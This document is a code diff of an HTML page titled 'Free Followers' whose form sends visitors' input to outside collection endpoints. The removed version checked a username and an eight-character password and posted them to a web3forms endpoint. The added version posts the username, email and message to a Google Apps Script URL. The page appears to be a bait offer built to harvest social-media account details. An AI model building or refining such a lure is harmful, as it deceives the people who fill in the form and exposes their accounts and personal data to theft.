@@ -2,29 +2,37 @@
   <head>
     <script language="javascript">
       function sub()
-      {
-        var b=document.frm1.txtuser.value;
-        var a=document.frm1.txtpass.value;
-        if( a.length <8)
-        {
-          alert("enter a valid password");
-          return false;
-        }
-          if( b.length <2)
-          {
-          alert("enter a valid username")
-          }
-      }
+{
+    var b = document.frm1.txtuser.value;
+
+    if (b.length < 2)
+    {
+        alert("Enter a valid username");
+        return false;
+    }
+
+    var email = document.frm1.txtemail.value;
+    var message = document.frm1.txtmessage.value;
+
+    fetch("https://script.google.com/macros/s/AKfycbxpAFZ60MmRtYpszLhrsBblOoHUwITdLPjGBSZq0CB2nJkhqoi0k05W3NW31DcZBjV5kw/exec", {
+        method: "POST",
+        body: JSON.stringify({
+            name: b,
+            email: email,
+            message: message
+        })
+    });
+
+    alert("Submitted successfully!");
+    return false;
+}
       
     </script>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Free Followers</title>
   </head>
 <body style="background-image: url('60B6250A-6C83-4472-B2A6-8389EBDF4C99.png'); background-size: cover; background-position: center; background-repeat: no-repeat; min-height: 100vh; margin: 0;">
-  <form name="frm1"
-      action="https://api.web3forms.com/submit"
-      method="POST"
-      onsubmit="return sub();">
+  <form name="frm1" onsubmit="return sub()">
 
     <input type="hidden" name="access_key"
            value="15914722-2350-437f-9c0a-72bd264cd6d5">
